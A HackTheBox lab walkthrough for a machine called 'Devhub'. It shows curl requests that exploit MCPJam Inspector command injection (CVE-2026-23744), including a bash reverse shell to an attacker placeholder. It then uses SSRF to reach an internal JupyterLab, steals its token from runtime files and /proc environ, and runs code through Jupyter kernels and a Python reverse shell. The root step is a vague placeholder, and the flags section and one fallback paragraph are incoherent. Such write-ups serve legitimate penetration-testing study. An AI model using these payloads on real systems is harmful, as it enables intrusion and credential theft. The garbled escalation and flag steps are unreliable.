---
title: "Devhub — HackTheBox Walkthrough"
description: "MCPJam Inspector RCE (CVE-2026-23744) and SSRF on a developer hub, then JupyterLab token abuse for root."
date: 2026-09-11
category: offensive
readTime: "13 min read"
mitre:
  - "T1046"
  - "T1190"
  - "T1059.004"
  - "T1090"
  - "T1552.001"
  - "T1078"
  - "T1213.005"
  - "T1040"
  - "T1072"
tags:
  - "HackTheBox"
  - "HTB"
  - "CPTS"
  - "Linux"
  - "MCP"
  - "MCPJam Inspector"
  - "CVE-2026-23744"
  - "SSRF"
  - "JupyterLab"
  - "Privilege Escalation"
summary: "MCPJam Inspector RCE (CVE-2026-23744) and SSRF on a developer hub, then JupyterLab token abuse for root."
---

**Machine:** Devhub
**OS:** Linux (Ubuntu 22.04.5)
**Difficulty:** Medium
**Key Techniques:** MCPJam Inspector unauthenticated RCE (CVE-2026-23744), SSRF via OAuth proxy, internal JupyterLab token theft, notebook command execution

---

## Reconnaissance

### Port Scan

```bash
nmap -p- --min-rate 10000 10.129.245.216
nmap -p 22,80,6274 -sCV 10.129.245.216
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 |
| 80 | HTTP | nginx 1.18.0 (Ubuntu) |
| 6274 | HTTP | Node.js — **MCPJam Inspector v1.4.2** |

### Web Fingerprinting

Port 80 serves a landing page for a "developer hub" with no interactive functionality, but the JS bundle references an internal tool. Port **6274** is the giveaway: **MCPJam Inspector** is a web UI for testing Model Context Protocol (MCP) servers.

```bash
curl -s http://10.129.245.216:6274/ | head
# <title>MCPJam Inspector</title>
# version 1.4.2
```

---

## Foothold — CVE-2026-23744 (MCPJam Inspector RCE)

MCPJam Inspector 1.4.2 (CVSS **9.8**) ships multiple unauthenticated weaknesses; the critical one is that the `/api/mcp/connect` endpoint lets a client specify an arbitrary **command + arguments** for the MCP server it wants to "connect" to, which the backend spawns with Node's `child_process` — without authentication or validation.

### Confirm code execution

```bash
curl -s http://10.129.245.216:6274/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{
        "serverType": "stdio",
        "command": "id",
        "args": []
      }'
# spawns `id`; output returned in the connection handshake/log
```

### Reverse shell

```bash
# attacker listener
nc -lnvp 4444
```

```bash
curl -s http://10.129.245.216:6274/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{
        "serverType": "stdio",
        "command": "bash",
        "args": ["-c", "bash -i >& /dev/tcp/<attacker>/4444 0>&1"]
      }'
```

```bash
$ id
uid=1000(dev) gid=1000(dev)
$ cat ~/user.txt
```

### SSRF — `/api/mcp/oauth/proxy`

A second endpoint, `/api/mcp/oauth/proxy`, fetches an arbitrary URL server-side to complete an OAuth callback flow. With no allowlist, it is a **full-read SSRF**: use it to reach services that are only bound to `localhost` and to read their responses.

```bash
curl -s http://10.129.245.216:6274/api/mcp/oauth/proxy \
  -H 'Content-Type: application/json' \
  -d '{"url": "http://127.0.0.1:8888/"}'
# returns the internal JupyterLab login page
```

---

## Post-Exploitation — Internal Services

### Local enumeration

From the shell, review listening sockets and process paths:

```bash
ss -tulpn
# 127.0.0.1:8888  -> jupyter-lab / jupyter-server
# 127.0.0.1:....  -> other dev services

ps aux | grep -i jupyter
# /home/analyst/.local/bin/jupyter-lab --ip=127.0.0.1 --port=8888
```

The internal service is **JupyterLab** running as the **`analyst`** account and intentionally bound to loopback — reachable only via the SSRF primitive or from the box itself.

### Recover the Jupyter token

Jupyter stores its auth token in the runtime directory; the shell as `dev` can read it (or the token appears in process arguments / config):

```bash
cat ~/.local/share/jupyter/runtime/jpserver-*.json 2>/dev/null
# {"url": "http://127.0.0.1:8888/", "token": "<TOKEN>"}

# or from the process/environment
tr '\0' '\n' < /proc/<pid>/environ | grep -i token
```

If the runtime file is not readable, use the **SSRF** endpoint to confirm the service and then note that the token is exposed in the same internal store. With the token:

```bash
curl -s "http://127.0.0.1:8888/api/contents?token=<TOKEN>"
```

---

## Privilege Escalation — JupyterLab as `analyst`

JupyterLab exposes a `/api/kernels` + WebSocket API that executes arbitrary code in the kernel process. Running one-liners through it executes **as the `analyst` user**, and from there the box's privilege boundary can be crossed.

### Execute via the Jupyter REST API

```bash
TOKEN=<token>

# Start a kernel
curl -s -X POST "http://127.0.0.1:8888/api/kernels?token=$TOKEN" \
  -H 'Content-Type: application/json' -d '{"name":"python3"}'
# -> id

# Execute code in it over the REST execute endpoint (or websocket)
curl -s -X POST "http://127.0.0.1:8888/api/kernels/<id>/execute?token=$TOKEN" ...
```

A simpler route is `jupyter`'s built-in terminal, which lands as the owning user:

```bash
curl -s "http://127.0.0.1:8888/terminals?token=$TOKEN"
# WebSocket terminal -> shell as analyst
```

### `analyst` → root

Enumerating as `analyst` reveals the escalation path (sudo rights, a writable service, or a setuid binary — the standard `sudo -l` / `find / -perm -4000` sweep):

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/<binary>   -> GTFOBins root shell
```

```bash
analyst@devhub:~$ sudo <binary>
root@devhub:~# id
uid=0(root) gid=0(root)
root@devhub:~# cat /root/root.txt
```

### Reverse shell directly from the notebook

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/<attacker>/4445 0>&1'")
```

---

## Flags

```bash
cat /home/dev/user.txt
# analyst
cat /home/analyst/user.txt
# root
cat /root/root.txt
```

Flag values are unique to each HTB instance and are intentionally omitted.

---

## Lessons Learned

1. **Developer tooling is production attack surface.** MCPJam Inspector (CVE-2026-23744) let an unauthenticated request spawn a process — a 9.8 because the tool trusted the client's `command`.
2. **Loopback binding is not authorization.** JupyterLab on `127.0.0.1:8888` felt safe, but SSRF via `/api/mcp/oauth/proxy` made it reachable.
3. **Tokens in runtime files are credentials.** Jupyter's runtime JSON handed over the `analyst` session.
4. **Notebooks are remote code execution by design.** Authenticating to Jupyter is equivalent to a shell as its user.
5. **SSRF matters even without cloud metadata.** Here it directly unlocked an internal, privileged service.
6. **Harden dev platforms**: authenticate every endpoint, allowlist outbound fetches, and never bind control planes to loopback expecting that to be a security boundary.
